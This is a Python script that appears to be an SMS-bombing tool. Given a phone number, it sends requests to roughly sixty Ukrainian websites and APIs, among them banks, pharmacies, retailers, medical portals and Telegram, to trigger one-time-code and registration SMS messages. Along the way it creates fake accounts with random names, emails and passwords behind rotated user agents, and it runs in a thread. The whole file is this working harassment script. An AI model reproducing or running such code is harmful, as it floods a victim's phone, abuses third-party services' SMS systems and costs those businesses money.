import random
from random import choice
from users_data.users_agent_list import get_agent
from datetime import datetime
import requests
import time
from threading import Thread

global services_number
services_number = 0
def send_for_number_sms(aa):
    headers = {
        'User-Agent': get_agent()
    }

    messages = ['Перезвоніть мені будь ласка', 'хочу поговорити за сам сайт','хочу проконсультоватись','чекаю вашого звінку']

    emails_list = ['prostoegorich2@gmail.com',
        'autoskilz068@gmail.com',
        'maksimbardic@gmail.com',
        'ttgbot.proekt@gmail.com',
        'webmine123@gmail.com']
    email = ''.join([random.choice(list('qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM')) for m in range(10)]) + '@gmail.com'

    with open('users_data\\nimes.txt', 'r',encoding='utf-8') as f:
        name = choice(f.read().split())
    with open('users_data\\surname.txt', 'r',encoding='utf-8') as f:
        surname = choice(f.read().split())
    password = ''.join([random.choice(list('йцукенгшщзфывапролдячсмитьбЙЦУКЕНГШЩЗФЫВАПРОЛДЯЧСМИТЬБ1234567890_')) for m in range(7)])

    uniq_number = f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}'
    uniq_number_minus = f'+{aa[:2]}-({aa[2:5]})-{aa[5:8]}-{aa[8:10]}-{aa[10:12]}'
    number_plus = '+' + aa

    hour = datetime.now().strftime('%H')
    minute = datetime.now().strftime('%M')
    day = datetime.now().strftime('%j')
    day = int(day)-1
        
    try:
        sms = requests.post('https://a-bank.com.ua/api/getcard/green',headers=headers, json={"client_phone": number_plus,"lang": "uk","type": "green","_": 1663097843709})    
        time.sleep(0.2)
        sms = requests.post('https://www.foxtrot.com.ua/uk/account/sendcodeagain',headers=headers, data={'phone': aa})   
        time.sleep(0.2)
        sms = requests.post('https://ucb.z.apteka24.ua/api/send/otp',headers=headers, json={"phone": aa})
        time.sleep(0.2)
        sms = requests.post('https://helsi.me/api/healthy/v2/accounts/login', headers=headers, json={'phone':aa,'platform':'PISWeb'})
        time.sleep(0.2)
        sms = requests.post('https://api.staff-clothes.com/api/v1/send-sms-code?access_token=MDFiNjdiNGFhZjU4ZDU0YzVkMjQ4NDMxYTI5YWM0Y2QzZjQzNjJhYjI4ZjY1ODJlOTZjN2QxMmQxNjM2OTMyNQ&locale=ua&action=register_new_user',headers=headers,data={'mobileNumber':aa}) 
        time.sleep(0.2)
        sms = requests.post('https://iq-pizza.eatery.club/site/v1/pre-login', headers=headers, data={'phone': aa}) 
        time.sleep(0.2)
        sms = requests.post('https://www.tarantino-family.com/wp-admin/admin-ajax.php', headers=headers, data={'action': 'ajax_register_user','step': '1','phone': aa,'smscode': '','security_login': '9df5729c62'}) 
        time.sleep(0.2)
        sms = requests.post('https://vilki-palki.od.ua/api/secret/generate?lang=russian', headers=headers, data={'phone': uniq_number}) 
        time.sleep(0.2)
        sms = requests.post('https://kasta.ua/api/v2/login/', headers=headers, json={'phone': aa}) 
        time.sleep(0.2)
        sms = requests.post('https://api.creditkasa.ua/public/auth/sendAcceptanceCode',headers=headers,json={"mobilePhone": aa}) 
        time.sleep(0.2)
        sms = requests.post('https://money4you.ua/api/clientRegistration/sendValidationSms',headers=headers,json={"phone": number_plus,"firstName": name,"lastName": surname,"fathersName": "Вавааав","udriveEmployee": 'false'}) 
        time.sleep(0.2)
        sms = requests.post('https://my.telegram.org/auth/send_password',headers=headers,data={'phone': number_plus}) 
        time.sleep(0.2)
        sms = requests.post('https://anc.ua/authorization/auth/v2/register',headers=headers,json={'login': f'{number_plus}'}) 
        time.sleep(0.2)
        sms = requests.get(f'https://www.add.ua/brander_smsconfirm_login/send/?telephone=+{aa}&code=&type=sms',headers=headers) 
        time.sleep(0.2)
        sms = requests.post('https://telemart.ua/auth/',headers=headers,data={'login': number_plus,'action': 'submitPassword','token': 'st'}) 
        time.sleep(0.2)
        sms = requests.post('https://vandalvape.com.ua/index.php?route=extension/module/sms_reg/SmsCheck',headers=headers, data={'phone': f'{aa[:2]}({aa[2:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}'}) 
        time.sleep(0.2)
        sms = requests.post('https://f.ua/ajax/callback/',headers=headers, data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','title': '','url': 'https://f.ua/','mail': '','notes': ''}) 
        time.sleep(0.2)
        sms = requests.get(f'https://c2c.oschadbank.ua/api/sms/{aa}',headers=headers) 
        time.sleep(0.2)
        sms = requests.post('https://cinemaciti.ua/',headers=headers,data={'email': choice(emails_list),'phone': aa,'arraySeats': '','terms_and_conditions': 'on'}) 
        time.sleep(0.2)
        sms = requests.post('https://apidev.color-it.ua/api/auth/code',headers=headers,json={'phone': aa[2:]}) 
        time.sleep(0.2)
        sms = requests.post('https://agro-market.net/ajax/auth.php',headers=headers, data={'mode': 'reg','phone': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}{aa[8:10]}{aa[10:12]}','name': name,'email': 'autoskilz068@gmail.com','code': '0','app': 'false'}) 
        time.sleep(0.2)
        sms = requests.post('https://money4you.ua/api/clientRegistration/sendValidationSms',headers=headers, json={"phone": number_plus,"firstName": name,"lastName": surname,"fathersName": name,"udriveEmployee": 'false'}) 
        time.sleep(0.2)
        sms = requests.post('https://agrotender.com.ua/buyerreg',headers=headers,data={'action': 'send-code','phone': aa}) 
        time.sleep(0.2)
        sms = requests.post('https://loyalty.vidi.ua/register',headers=headers,data={'locale': 'ua','name': name,'lname': surname,'mname': name,'email': email,'phone': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}', 'password': password}) 
        time.sleep(0.2)
        sms = requests.post('https://automoto.ua/uk/my-office/login',headers=headers,json={"phone": f'{aa[:2]} {aa[2:5]} {aa[5:8]}{aa[8:10]}{aa[10:12]}'}) 
        time.sleep(0.2)
        sms = requests.get(f'https://api.eldorado.ua/v1/sign/?login={aa}&step=password-recovery-step&lang=ua',headers=headers) 
        time.sleep(0.2)
        sms = requests.post('https://synthetic.ua/api/auth/register/',headers=headers,json={"mobile_phone": aa,"password": "кнкнккнекне","password_confirm": "кнкнккнекне"}) 
        time.sleep(0.2)
        sms = requests.post('https://api.starylev.com.ua/api/v1.1/sms/sent',headers=headers,json={"phone": aa,"email": email}) 
        time.sleep(0.2)
        sms = requests.post('https://api.creditkasa.ua/public/auth/sendAcceptanceCode',headers=headers,json={"mobilePhone": aa})
        time.sleep(0.2)
        sms = requests.post('https://my.tpozyka.com/registration-handle-1',headers=headers,data={'data':f'lastname={surname}&name={name}&phone=%2B{aa[:2]}+({aa[2:5]})+{aa[5:8]}-{aa[8:10]}-{aa[10:12]}'}) 
        time.sleep(0.2)
        sms = requests.post('https://ticketsbox.com/?route=account/authorization',headers=headers, data={'username': aa,'type': 'lost'}) 
        time.sleep(0.2)
        sms = requests.post('https://vchehle.ua/uk/register',headers=headers, data={'email': number_plus,'password': 'gdfgdfgfddgf','password_confirmation': 'gdfgdfgfddgf'}) 
        time.sleep(0.2)
        sms = requests.post('https://my.lun.ua/api/user/login',headers=headers, json={'login': number_plus}) 
        time.sleep(0.2)
        sms = requests.post('https://api.riel.ua/graphql',headers=headers, json={"operationName": "StoreSendSms","variables": {"phone": aa},"query": "mutation StoreSendSms($phone: String) {\n  storeSendSms(phone: $phone)\n}\n"}) 
        time.sleep(0.2)
        sms = requests.post('https://pcshop.ua/index.php?route=account/register/validateFirstStep',headers=headers,data={'lastname': name,'firstname': surname,'email': email,'telephone': aa,'password': '','fax':  '','address_1':  '','city':  '','country_id':''  ,'zone_id':  '','newsletter': 1}) 
        time.sleep(0.2)
        sms = requests.get(f'https://bond.od.ua/newclient///?phone=+{aa}',headers=headers) 
        time.sleep(0.2)
        sms = requests.post('https://megasport.ua/api/auth/phone/?language=ua',headers=headers,json={'phone': number_plus}) 
        time.sleep(0.2)
        sms = requests.post(f'https://my.hmara.tv/api/sign?contact={aa}',headers=headers) 
        time.sleep(0.2)
        sms = requests.post('https://api.sweet.tv/SignupService/SetPhone.json',headers=headers,json={"device": {"type": "DT_Web_Browser","application": {"type": "AT_SWEET_TV_Player"},"model": get_agent(),"firmware": {"versionCode": 1,"versionString": "3.2.28"},"uuid": "3408e209-12b7-4102-bb92-b327151bff9f","supported_drm": {"widevine_modular": True}},"phone": aa}) 
        time.sleep(0.2)
        sms = requests.post('https://www.pratik.com.ua/uk/?gclid=CjwKCAjw1ICZBhAzEiwAFfvFhIWCEV44RWKP16RvSC3Cj8E-ntL6NkYlW2V9kAyBugHoTLRziRZzrhoC_sUQAvD_BwE',headers=headers,data={'phone': f'+{aa[:2]} {aa[2:5]} {aa[5:8]} {aa[8:10]} {aa[10:12]}','action_form': 'get_auth_sms'})    
        time.sleep(0.2)
        sms = requests.post('https://angio.com.ua/send_login_code',headers=headers,data={'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','remember': 'false'})    
        time.sleep(0.2)
        sms = requests.post('https://gepur.com/rapi/auth/register-retail-buyer',headers=headers,json={"email": email,"password": password,"phone": number_plus,"fio": f"{name} {surname} {name}"})    
        time.sleep(0.2)
        sms = requests.post('https://ehr.h24.ua/api/v2/signup',headers=headers,json={"phone_number": number_plus})    
        time.sleep(0.2)
        sms = requests.get(f'https://dok.ua/profile/newsms/{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}',headers=headers)    
        time.sleep(0.2)
        sms = requests.post('https://go.varus.ua/api/ext/uas/auth/send-otp?storeCode=ua',headers=headers,json={'phone': number_plus})    
        time.sleep(0.2)
        sms = requests.post('https://www.iqos.com.ua/ru',headers=headers,data={'check_login_only': 'Y','validate_sms_code': 'N','result_ids': 'result','user_type': 'K','user_data[phone]': f'+{aa[:2]}({aa[2:5]}){aa[5:8]}{aa[8:10]}{aa[10:12]}','ship_to_another': '1','user_data[firstname]': name,'user_data[lastname]': surname,'user_data[gender]': '3','user_data[birthday]': '16/10/2000','user_data[s_state]': '144','user_data[terms_and_conditions]': 'Y','user_data[AcceptedTermAndConditionId]': '9','user_data[las_preference]': 'Y','code_1': '','code_2': '','code_3': '','code_4': '','code': '','is_ajax': '1','dispatch[profiles.update]': ''})     
        time.sleep(0.2)
        sms = requests.post('https://brand-centr.com/index.php?route=extension/module/sms_reg/SmsCheck',headers=headers, data={'phone': aa})    
        time.sleep(0.2)
        sms = requests.post('https://api.likari.in.ua/v2/auth/sms',headers=headers, json={'phone': f'{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}'})    
        time.sleep(0.2)
        sms = requests.post('https://auth.easypay.ua/api/check',headers=headers, json={"phone": aa})    
        time.sleep(0.2)
        sms = requests.post('https://izi.ua/api/auth/user-by-phone',headers=headers, json={'phone': aa})
        time.sleep(0.2)
        sms = requests.post('https://tea.ua/api/web/auth/verifyPhone',headers=headers, json={'phone': f'{aa[2:5]}{aa[5:8]}{aa[8:10]}{aa[10:12]}', 'phoneCode': "+38"})
        time.sleep(0.2)
        sms = requests.post('https://smaki-maki.com/wp-admin/admin-ajax.php',headers=headers,data={'name': name,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','birthday': '15.01.1998','password': password,'password2': password,'code': '','action': 'register_user'})
        time.sleep(0.2)
        sms = requests.post('https://welovemebel.com.ua/ajax/auth_register.php',headers=headers,data={'USER_LOGIN': number_plus,'USER_EMAIL': email,'SECRET': 'secretcode'})
        time.sleep(0.2)
        sms = requests.post('https://carta.ua/api/v1.0/register/user',headers=headers,json={"username": name,"phone": f'({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}',"plainPassword": {"first": password,"second": password},"confirmType": "phone"})
        time.sleep(0.2)
        sms = requests.post('https://maslotom.com/api/index.php?route=api/account/phoneLogin',headers=headers,data={'phone': f'+{aa[:3]}({aa[3:5]}){aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        time.sleep(0.2)
        sms = requests.post('https://prontopizza.ua/lviv/wp-admin/admin-ajax.php',headers=headers,data={'first_name': name,'last_name': surname,'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','input_check_send_sms': '','email': email,'password': password,'password2': password,'agree': 'on','action': 'register_user'})
        time.sleep(0.2)
        sms = requests.post('https://api.sezamfood.com.ua/ru/request/auth-phone',headers=headers,json={"phone": aa,"agree": 1})
        time.sleep(0.2)
        sms = requests.post('https://www.garrys.com.ua/ajax/reguser/',headers=headers,data={'name': name,'login': f'{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}','password': password,'control': '1'})
        time.sleep(0.2)
        sms = requests.post('https://www.garrys.com.ua/ajax/remind_password/',headers=headers,data={'nphone': f'{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
        time.sleep(0.2)
        sms = requests.post('https://www.lumident.kiev.ua/form/ua/appointmentHeader',headers=headers,data={'phone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}'})
        time.sleep(0.2)
        sms = requests.post('https://odrex.top/api/sms',headers=headers,json={"phone": aa,"sms_code_type": "random","type": "registration"})
        time.sleep(0.2)
        sms = requests.post('https://auth2.multiplex.ua/login',headers=headers,json={"login": aa})
        time.sleep(0.2)
        sms = requests.post('https://samsonite.ua/auth/loginbyphone',headers=headers,data={'phone': '+'+aa[:2] + ' ' + aa[2:5] + ' ' + aa[5:8]+ '-' + aa[8:10]+ '-' +aa[10:12],'code': ''})
    except:
        pass
    print('все')

def start(aa):
    st = Thread(target=send_for_number_sms,args=(aa,))
    st.start()